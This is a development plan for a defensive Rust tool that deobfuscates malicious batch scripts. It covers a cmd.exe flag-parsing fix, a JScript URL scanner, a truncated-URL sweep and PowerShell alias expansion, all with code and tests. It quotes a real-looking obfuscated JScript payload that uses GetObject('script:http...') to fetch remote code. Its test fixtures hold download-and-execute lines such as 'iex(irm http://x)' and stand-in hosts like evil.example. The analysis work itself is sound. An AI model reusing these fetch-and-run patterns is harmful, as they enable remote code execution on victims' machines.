# batdeob Plan O — cmd.exe path fix + JS URL scanner + trunc-URL vars + PS alias expansion

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development.

**Goal:** Four improvements combining the Plan N investigation findings (+48 samples) with a PowerShell alias-expansion feature for readability and defense-in-depth URL coverage.

**Prereq:** Plans A-N landed. 249 tests, v13 corpus 758/1415 (53.6%) URL coverage.

---

## Task 1: Fix `cmd C:\WINDOWS\system32\cmd.exe /V/D/c "..."` (+small subset of 36)

The CMD_RE regex doesn't match when (a) an explicit path appears between `cmd` and the flags and (b) flags are concatenated without spaces (`/V/D/c` instead of `/V /D /c`).

**Files:** Modify `rust/crates/batdeob-core/src/handlers/cmd.rs`

- [ ] **Step 1: Add test** to `lib.rs`:

```rust
#[cfg(test)]
mod cmd_path_flags_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;

    #[test]
    fn cmd_with_explicit_path_and_concat_flags() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"start /MIN cmd C:\WINDOWS\system32\cmd.exe /V/D/c "echo inner""#, &mut env);
        assert!(env.exec_cmd.iter().any(|c| c.contains("echo inner")),
                "concat-flag inner not extracted: {:?}", env.exec_cmd);
    }
}
```

- [ ] **Step 2: Update `CMD_RE`** in `handlers/cmd.rs` — replace the strict alternation in the prefix-skip with a permissive `/[A-Za-z0-9:]*\s*` repeat. Also allow an explicit path like `C:\WINDOWS\system32\cmd.exe` between the leading `cmd` and the flags:

```rust
static CMD_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)^\s*\S*cmd(?:\.exe)?(?:\s+\S*cmd(?:\.exe)?)?(?:\s*/[A-Za-z0-9:]+)*\s*(?:/c|/r)\s+(?P<cmd>.*)$"
    ).expect("cmd regex")
});
```

The new addition `(?:\s+\S*cmd(?:\.exe)?)?` makes the explicit-path repeat optional. The flags use `/[A-Za-z0-9:]+` to handle `/V`, `/V:ON`, and concat forms like `/V/D/c` (which becomes `/V`, then `/D`, then `/c`).

Wait — `/V/D/c` is THREE flags concatenated without spaces. The regex `(?:\s*/[A-Za-z0-9:]+)*` requires `\s*` between flags. Update:

```rust
    Regex::new(
        r"(?i)^\s*\S*cmd(?:\.exe)?(?:\s+\S*cmd(?:\.exe)?)?\s*(?:/[A-Za-z0-9:]+\s*)*(?:/c|/r)\s+(?P<cmd>.*)$"
    ).expect("cmd regex")
```

`/[A-Za-z0-9:]+\s*` allows `/V/D/c` to be parsed as 3 sequential flags. Test with the smoke case to confirm.

- [ ] **Step 3: Update `has_v_on_raw`** similarly — same pattern issue.

Find the `has_v_on_raw` function. Make sure it accepts `/V/D/c` form (currently might require `/v:on` with explicit colon).

- [ ] **Step 4: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "cmd handler: accept explicit cmd.exe path + concat flags (/V/D/c)"
```

---

## Task 2: JS-payload URL scanner (rest of the 36-sample family)

The decoded `.Js` payload from the cmd.exe chain contains JScript:

```javascript
var CzyA="sc"+"r"; DzyA="ip"+"t:h"; EzyA="T"+"tP"+":";
GetObject(CzyA+DzyA+EzyA+"//w3oakr.hepbsgjgueugggmouog.blog/?1/");
```

Or with `\uXXXX` escapes: `eval("GetOb..." ...)`.

**Files:** Create `rust/crates/batdeob-core/src/js_scan.rs`. Wire from `analyze()`.

- [ ] **Step 1: Add `Trait::JsExec`** and a `Vec<Vec<u8>>` accumulator on Environment (`all_extracted_js`).

Update env.rs `Environment` field group "Output accumulators": add
```rust
    pub all_extracted_js: Vec<Vec<u8>>,
```

Update `handlers/cscript.rs` to push BOTH `exec_jscript` (transient) and `all_extracted_js` (cumulative).

Hmm — we already have `exec_jscript` and `all_extracted_jscript` from Plan H. Verify by reading `env.rs`. If `all_extracted_jscript` exists, use that name throughout. Match existing convention.

- [ ] **Step 2: Add a parallel scanner** to `vbs_scan.rs`'s pattern, but for JScript. Create `js_scan.rs`:

```rust
//! JScript payload post-processing: extract URLs from JS payloads.
//! Catches GetObject(str+str+str), WScript.Shell.Run("..."), \uXXXX-encoded eval, etc.

use crate::env::Environment;
use crate::traits::Trait;
use once_cell::sync::Lazy;
use regex::Regex;

#[allow(clippy::expect_used)]
static GETOBJECT_RE: Lazy<Regex> = Lazy::new(|| {
    // GetObject("...") — URL or moniker as a string literal (after concat resolution)
    Regex::new(r#"(?i)GetObject\s*\(\s*['"]([^'"]+)['"]"#).expect("getobject")
});

#[allow(clippy::expect_used)]
static URL_IN_JS_RE: Lazy<Regex> = Lazy::new(|| {
    // Generic URL match — picks up any http(s)/ftp in the JS text
    Regex::new(r#"((?:script:|)https?://[^\s"'<>(){}\[\]\\|^&]+)"#).expect("url-in-js")
});

#[allow(clippy::expect_used)]
static U_ESCAPE_RE: Lazy<Regex> = Lazy::new(|| {
    // HT... — sequences of \uXXXX hex escapes
    Regex::new(r#"((?:\\u[0-9a-fA-F]{4}){4,})"#).expect("u-escape")
});

#[allow(clippy::expect_used)]
static JS_STRING_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // "a"+"b"+"c"   (2+ string concat)
    Regex::new(r#"((?:"[^"]*"\s*\+\s*){1,}"[^"]*")"#).expect("js str concat")
});

pub fn scan_js_payloads(env: &mut Environment) {
    let payloads: Vec<Vec<u8>> = env.all_extracted_jscript.clone();
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    for (idx, payload) in payloads.iter().enumerate() {
        let raw = String::from_utf8_lossy(payload).into_owned();
        // First pass: decode \uXXXX escapes
        let decoded = decode_u_escapes(&raw);
        // Second pass: collapse "a"+"b"+"c" concat
        let concat_resolved = expand_js_string_concat(&decoded);

        // Now scan for URLs
        for caps in URL_IN_JS_RE.captures_iter(&concat_resolved) {
            let Some(m) = caps.get(1) else { continue };
            let mut url = m.as_str().to_string();
            // Strip "script:" prefix that GetObject uses
            if let Some(rest) = url.strip_prefix("script:") {
                url = rest.to_string();
            }
            // Trim trailing punctuation
            while let Some(last) = url.chars().last() {
                if matches!(last, ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?') {
                    url.pop();
                } else { break; }
            }
            if !url.starts_with("http://") && !url.starts_with("https://") && !url.starts_with("ftp://") {
                continue;
            }
            if !seen.insert((idx, url.clone())) { continue; }
            let snippet: String = concat_resolved.chars().take(120).collect();
            env.traits.push(Trait::Download {
                cmd: format!("(js #{idx}) {snippet}"),
                src: url,
                dst: None,
            });
        }
    }
}

fn decode_u_escapes(text: &str) -> String {
    let mut out = text.to_string();
    let matches: Vec<(usize, usize, String)> = U_ESCAPE_RE.captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let s = caps.get(1)?.as_str();
            let mut decoded = String::new();
            for chunk in s.as_bytes().chunks(6) {
                // \uXXXX = 6 bytes
                if chunk.len() != 6 { continue; }
                let hex_str = std::str::from_utf8(&chunk[2..6]).ok()?;
                let code = u32::from_str_radix(hex_str, 16).ok()?;
                decoded.push(char::from_u32(code)?);
            }
            Some((full.start(), full.end(), decoded))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_js_string_concat(text: &str) -> String {
    let mut out = text.to_string();
    #[allow(clippy::expect_used)]
    let part_re = Regex::new(r#""([^"]*)""#).expect("js part");
    let matches: Vec<(usize, usize, String)> = JS_STRING_CONCAT_RE.captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            let mut combined = String::new();
            for part in part_re.captures_iter(inner) {
                if let Some(p) = part.get(1) { combined.push_str(p.as_str()); }
            }
            Some((full.start(), full.end(), format!(r#""{}""#, combined)))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}
```

Wire from `analyze()`:

```rust
    ps1_scan::scan_ps1_payloads(&mut env);
    vbs_scan::scan_vbs_payloads(&mut env);
    js_scan::scan_js_payloads(&mut env);  // NEW
    deob_scan::scan_deob_text(&out, &mut env);
    // ... rest unchanged
```

- [ ] **Step 3: Add tests**

```rust
#[cfg(test)]
mod js_url_extraction_tests {
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn js_string_concat_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var a="sc"+"r"; b="ipt:ht"; c="tp://"; GetObject(a+b+c+"evil.example/x")"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.example/x")
        ));
        assert!(has, "JS concat URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_u_escape_decoded() {
        let mut env = Environment::new(&Config::default());
        // http://x.com = "http://x.com"
        let js = br#"eval("http://x.com")"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("x.com")
        ));
        assert!(has, "u-escape URL missed: {:?}", env.traits);
    }
}
```

- [ ] **Step 4: Commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "Add js_scan: extract URLs from JScript payloads (GetObject/concat/uXXXX)"
```

---

## Task 3: Truncated URL var sweep (`"=://hostname"`) (+12 samples)

When non-ASCII variable names break substring resolution, the SET value gets stranded in the deob text as `"=://...`. Regex sweep for it.

**Files:** Modify `rust/crates/batdeob-core/src/deob_scan.rs`

- [ ] **Step 1: Add test**

```rust
#[cfg(test)]
mod truncated_url_var_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn truncated_url_var_extracted() {
        let script = b"set \"X==://evil.example/loader.bat\"\r\necho %X%\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("evil.example/loader.bat")
        ));
        assert!(has, "trunc URL not extracted: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add `scan_truncated_url_vars`** to `deob_scan.rs`

```rust
#[allow(clippy::expect_used)]
static TRUNC_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#""=(?:https?)?://([A-Za-z0-9][A-Za-z0-9.\-]{3,}\.[A-Za-z]{2,}(?::\d+)?(?:/[^"\s]*)?)"#)
        .expect("trunc url")
});

pub fn scan_truncated_url_vars(deobfuscated: &str, env: &mut Environment) {
    let known: std::collections::HashSet<String> = env.traits.iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in TRUNC_URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let url = format!("https://{}", m.as_str());
        if known.contains(&url) { continue; }
        if !seen.insert(url.clone()) { continue; }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "trunc-url-var".to_string(),
        });
    }
}
```

Wire from `analyze()` after `scan_bare_b64_urls`.

- [ ] **Step 3: Commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "deob_scan: sweep truncated URL vars ('=://host/...') from non-ASCII obfuscation"
```

---

## Task 4: PowerShell alias expansion (analyst readability + URL coverage)

**Files:**
- Create: `rust/crates/batdeob-core/src/ps_alias.rs`
- Modify: `rust/crates/batdeob-core/src/lib.rs` (Report struct + analyze + tests)
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs` (use normalized text as additional URL-scan target)
- Modify: `rust/crates/batdeob-cli/src/main.rs` (summarize emits normalized samples)

**Design:**
- A new `ps_alias::expand_aliases(text) -> String` function maps PowerShell aliases to canonical cmdlets via a fixed table
- Report gains `extracted_ps1_normalized: Vec<String>` mirroring `extracted_ps1`
- `analyze` populates the normalized field; `scan_ps1_payloads` runs URL regexes over the normalized text too (dedup against existing)
- `summarize` shows the normalized version in `extracted.powershell_samples` (more readable)

- [ ] **Step 1: Create `ps_alias.rs`**

```rust
//! PowerShell alias expansion. Replaces common aliases with their
//! canonical cmdlet names for analyst readability and to ensure
//! URL-extraction regexes catch alias forms.

use once_cell::sync::Lazy;
use std::collections::HashMap;

// Source: PowerShell 5.1 default aliases (Get-Alias)
// https://learn.microsoft.com/en-us/powershell/scripting/learn/shell/using-aliases
const ALIAS_TABLE: &[(&str, &str)] = &[
    // Networking
    ("iwr", "Invoke-WebRequest"),
    ("irm", "Invoke-RestMethod"),
    ("wget", "Invoke-WebRequest"),
    ("curl", "Invoke-WebRequest"),
    // Execution
    ("iex", "Invoke-Expression"),
    ("icm", "Invoke-Command"),
    ("ihy", "Invoke-History"),
    // Item operations
    ("gi", "Get-Item"),
    ("gci", "Get-ChildItem"),
    ("ls", "Get-ChildItem"),
    ("dir", "Get-ChildItem"),
    ("ni", "New-Item"),
    ("ri", "Remove-Item"),
    ("rm", "Remove-Item"),
    ("rmdir", "Remove-Item"),
    ("del", "Remove-Item"),
    ("erase", "Remove-Item"),
    ("ci", "Copy-Item"),
    ("cp", "Copy-Item"),
    ("copy", "Copy-Item"),
    ("mi", "Move-Item"),
    ("mv", "Move-Item"),
    ("move", "Move-Item"),
    ("rni", "Rename-Item"),
    ("ren", "Rename-Item"),
    // Item property
    ("gp", "Get-ItemProperty"),
    ("sp", "Set-ItemProperty"),
    ("clp", "Clear-ItemProperty"),
    ("rp", "Remove-ItemProperty"),
    // Content
    ("gc", "Get-Content"),
    ("type", "Get-Content"),
    ("cat", "Get-Content"),
    ("sc", "Set-Content"),
    ("ac", "Add-Content"),
    ("clc", "Clear-Content"),
    // Variables
    ("gv", "Get-Variable"),
    ("sv", "Set-Variable"),
    ("nv", "New-Variable"),
    ("rv", "Remove-Variable"),
    // Location
    ("cd", "Set-Location"),
    ("chdir", "Set-Location"),
    ("sl", "Set-Location"),
    ("pwd", "Get-Location"),
    ("gl", "Get-Location"),
    ("popd", "Pop-Location"),
    ("pushd", "Push-Location"),
    // Output
    ("echo", "Write-Output"),
    ("write", "Write-Output"),
    // Object operations
    ("?", "Where-Object"),
    ("where", "Where-Object"),
    ("%", "ForEach-Object"),
    ("foreach", "ForEach-Object"),
    ("select", "Select-Object"),
    ("sort", "Sort-Object"),
    ("group", "Group-Object"),
    ("measure", "Measure-Object"),
    ("tee", "Tee-Object"),
    // Processes
    ("ps", "Get-Process"),
    ("gps", "Get-Process"),
    ("kill", "Stop-Process"),
    ("spps", "Stop-Process"),
    ("saps", "Start-Process"),
    ("start", "Start-Process"),
    // History
    ("h", "Get-History"),
    ("history", "Get-History"),
    // Modules
    ("ipmo", "Import-Module"),
    ("rmo", "Remove-Module"),
    ("gmo", "Get-Module"),
    // Misc
    ("clear", "Clear-Host"),
    ("cls", "Clear-Host"),
    ("man", "Get-Help"),
    ("help", "Get-Help"),
    ("gjb", "Get-Job"),
    ("rcjb", "Receive-Job"),
    // Type / member
    ("gm", "Get-Member"),
    ("gu", "Get-Unique"),
    // Conversion
    ("etsn", "Enter-PSSession"),
    ("rcv", "Receive-Job"),
];

static ALIAS_MAP: Lazy<HashMap<&'static str, &'static str>> = Lazy::new(|| {
    ALIAS_TABLE.iter().copied().collect()
});

/// Replace standalone alias tokens with their canonical cmdlet names.
/// Word-boundary aware; case-insensitive match; preserves the rest verbatim.
pub fn expand_aliases(text: &str) -> String {
    use regex::Regex;
    // Match a PS token (word) at a position where it could be a command:
    // - start of input, OR
    // - after whitespace, `;`, `|`, `(`, `{`, `&`, or `\n`
    // Capture the token; if it's an alias (case-insensitive), replace with canonical.
    #[allow(clippy::expect_used)]
    let re = Regex::new(r"(?P<lead>^|[\s;|(){}&])(?P<tok>[A-Za-z?%]+)\b")
        .expect("alias re");
    let mut out = String::with_capacity(text.len());
    let mut last_end = 0;
    for caps in re.captures_iter(text) {
        let m = match caps.get(0) { Some(m) => m, None => continue };
        out.push_str(&text[last_end..m.start()]);
        let lead = caps.name("lead").map(|x| x.as_str()).unwrap_or("");
        let tok = caps.name("tok").map(|x| x.as_str()).unwrap_or("");
        let key = tok.to_ascii_lowercase();
        if let Some(canonical) = ALIAS_MAP.get(key.as_str()) {
            out.push_str(lead);
            out.push_str(canonical);
        } else {
            out.push_str(&text[m.start()..m.end()]);
        }
        last_end = m.end();
    }
    out.push_str(&text[last_end..]);
    out
}
```

- [ ] **Step 2: Add to `Report`**

```rust
#[derive(Debug, Clone)]
pub struct Report {
    pub deobfuscated: String,
    pub traits: Vec<Trait>,
    pub extracted_cmd: Vec<String>,
    pub extracted_ps1: Vec<Vec<u8>>,
    pub extracted_ps1_normalized: Vec<String>,  // NEW
}
```

In `analyze()`, after extracting all the ps1 payloads and before returning, build the normalized list:

```rust
let extracted_ps1_normalized: Vec<String> = env.all_extracted_ps1.iter()
    .map(|bytes| {
        let text = String::from_utf8_lossy(bytes);
        ps_alias::expand_aliases(&text)
    })
    .collect();
```

Add `pub mod ps_alias;` to lib.rs.

- [ ] **Step 3: Use normalized text in ps1_scan**

In `scan_ps1_payloads`, also scan the alias-expanded version:

```rust
let raw_text = ...;
let text_raw = expand_obfuscation(&raw_text);
let text_aliased = ps_alias::expand_aliases(&text_raw);
// Run URL regexes over BOTH, dedup by URL
```

- [ ] **Step 4: Update summarize**

In `build_summary`, prefer the normalized version when emitting `powershell_samples`:

```rust
let ps_samples: Vec<String> = report.extracted_ps1_normalized.iter().take(3)
    .map(|s| s.chars().take(500).collect())
    .collect();
```

- [ ] **Step 5: Tests**

```rust
#[cfg(test)]
mod ps_alias_tests {
    use crate::ps_alias::expand_aliases;

    #[test]
    fn iex_expanded() {
        assert_eq!(expand_aliases("iex something"), "Invoke-Expression something");
    }

    #[test]
    fn iwr_irm_expanded() {
        let out = expand_aliases("iex(irm http://x)");
        assert!(out.contains("Invoke-Expression"));
        assert!(out.contains("Invoke-RestMethod"));
    }

    #[test]
    fn ni_expanded_in_function_def() {
        let out = expand_aliases("(ni -p function: -n Decoder)");
        assert!(out.contains("New-Item"), "got: {}", out);
    }

    #[test]
    fn non_alias_preserved() {
        let out = expand_aliases("MyCustomFunction $x");
        assert_eq!(out, "MyCustomFunction $x");
    }

    #[test]
    fn case_insensitive_match() {
        let out = expand_aliases("IEX (IWR $u)");
        assert!(out.contains("Invoke-Expression"));
        assert!(out.contains("Invoke-WebRequest"));
    }
}
```

- [ ] **Step 6: Commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/ rust/crates/batdeob-cli/src/main.rs
git commit -m "Add ps_alias: expand PS aliases (iex/iwr/irm/ni/etc.) for readability + URL coverage"
```

---

## Task 5: Corpus v14 + measurement

- [ ] **Step 1: Build + run**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3
sed 's|corpus_results_v13|corpus_results_v14|g' /tmp/corpus_run_v13.sh > /tmp/corpus_run_v14.sh
chmod +x /tmp/corpus_run_v14.sh
mkdir -p /tmp/corpus_results_v14 && rm -rf /tmp/corpus_results_v14/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v14.sh > /tmp/corpus_run_v14.log 2>&1
ls /tmp/corpus_results_v14/*.json | wc -l
```

- [ ] **Step 2: Compare v13 → v14** — same Python script pattern as Plan N Task 4, comparing per-sample. Target: +40 to +60 samples gaining URL IOC (Plan O investigation estimated +48; alias expansion is bonus defense-in-depth).

- [ ] **Step 3: Smoke-test summarize** on a sample to confirm normalized PS is in the output:

```bash
./target/release/batdeob summarize /home/coz/cstorage/mbzdls/SKMBT28736292.bat | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['extracted']['powershell_samples'][0][:300] if d['extracted']['powershell_samples'] else '<none>')"
```

If the output shows `Invoke-WebRequest` where it used to say `iwr` (or `Invoke-RestMethod` for `irm`), the alias expansion works.

- [ ] **Step 4: Commit completion marker**

## Report

- v13 → v14 deltas
- Samples gained (target: +40 to +60)
- Test count (target: 249 + ~10 new = 259)
- `summarize` output before/after showing alias expansion
- 5 commit SHAs

---

## Self-review

- **Spec coverage**: 4 features from Plan N investigation (cmd path + JS scanner + trunc URL + alias expansion). All localized in scope.
- **Risk**: Alias expansion could match in unexpected contexts (string literals, comments). The word-boundary + lead-char anchors mitigate this. Test the case-insensitive + non-alias cases to verify.

**Plan O complete.** Execute via `superpowers:subagent-driven-development`.
